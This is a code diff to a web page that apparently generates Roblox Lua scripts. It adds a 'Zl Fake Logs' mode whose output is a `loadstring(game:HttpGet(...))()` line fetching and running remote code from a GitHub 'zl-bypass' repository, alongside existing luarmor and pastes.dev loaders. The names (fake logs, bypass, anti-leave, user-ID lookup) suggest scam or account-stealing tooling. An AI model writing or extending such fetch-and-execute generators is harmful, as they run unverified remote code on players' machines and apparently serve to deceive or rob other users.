@@ -84,7 +84,7 @@ body{background:#040404;color:#f0f0f0;font-family:-apple-system,BlinkMacSystemFo
 .mode-tabs{display:flex;background:#070709;border:1px solid #2a1515;border-radius:12px;margin-bottom:12px;position:relative;padding:3px}
 .mode-btn{flex:1;padding:10px;background:transparent;border:none;border-radius:10px;color:#aaa;cursor:pointer;font-size:11px;z-index:2;position:relative;text-align:center}
 .mode-btn.active{color:#fff;font-weight:bold}
-.mode-slider{position:absolute;top:3px;bottom:3px;left:3px;width:calc(25% - 2px);background:linear-gradient(135deg,#dc2626,#991b1b);border-radius:10px;transition:transform .35s;z-index:1}
+.mode-slider{position:absolute;top:3px;bottom:3px;left:3px;width:calc(20% - 2px);background:linear-gradient(135deg,#dc2626,#991b1b);border-radius:10px;transition:transform .35s;z-index:1}
 .custom-area{display:none;margin-top:8px}
 .br-select-btn{width:100%;padding:12px;background:#070709;border:1px solid #2a1515;border-radius:12px;display:flex;justify-content:space-between;cursor:pointer;color:#aaa}
 .position-relative{position:relative}
@@ -374,7 +374,8 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
         <button class="mode-btn active" data-mode="NO-GUI" data-index="0">NO-GUI</button>
         <button class="mode-btn" data-mode="AUTO-CODE" data-index="1">AUTO CODE</button>
         <button class="mode-btn" data-mode="DUEL" data-index="2">DUEL</button>
-        <button class="mode-btn" data-mode="CUSTOM" data-index="3">CUSTOM</button>
+        <button class="mode-btn" data-mode="ZL-FAKE-LOGS" data-index="3">Zl Fake Logs</button>
+        <button class="mode-btn" data-mode="CUSTOM" data-index="4">CUSTOM</button>
       </div>
       <div class="custom-area" id="customArea" style="display:none;">
         <input class="inp" id="customLoader" data-i18n-placeholder="customLoaderPh" placeholder="Example: https://tu-ui.com/ui.lua">
@@ -1962,6 +1963,7 @@ function renderThumbHtml(type, name) {
 const LOGIC_LOADER="https://api.luarmor.net/files/v4/loaders/a801d34093cb75d1b90c882704daabee.lua";
 const AUTO_CODE_LOADER="https://raw.githubusercontent.com/ZLHubOp/1OF1/refs/heads/main/autocode";
 const DUEL_LOADER="https://api.pastes.dev/pDQSJe56Xv";
+const ZL_FAKE_LOGS_LOADER="https://raw.githubusercontent.com/ZLHubOp/zl-bypass/refs/heads/main/zlfinder";
 
 // AUTO-LOOKUP ROBLOX USER -> ID
 let lookupTimer = null;
@@ -2355,6 +2357,8 @@ async function generateScript(){
     customBlock = `loadstring(game:HttpGet("${AUTO_CODE_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
   } else if(scriptMode === "DUEL") {
     customBlock = `loadstring(game:HttpGet("${DUEL_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+  } else if(scriptMode === "ZL-FAKE-LOGS") {
+    customBlock = `loadstring(game:HttpGet("${ZL_FAKE_LOGS_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
   }
 
   const useAntiLeave = document.getElementById("toggleAntiLeave").checked;
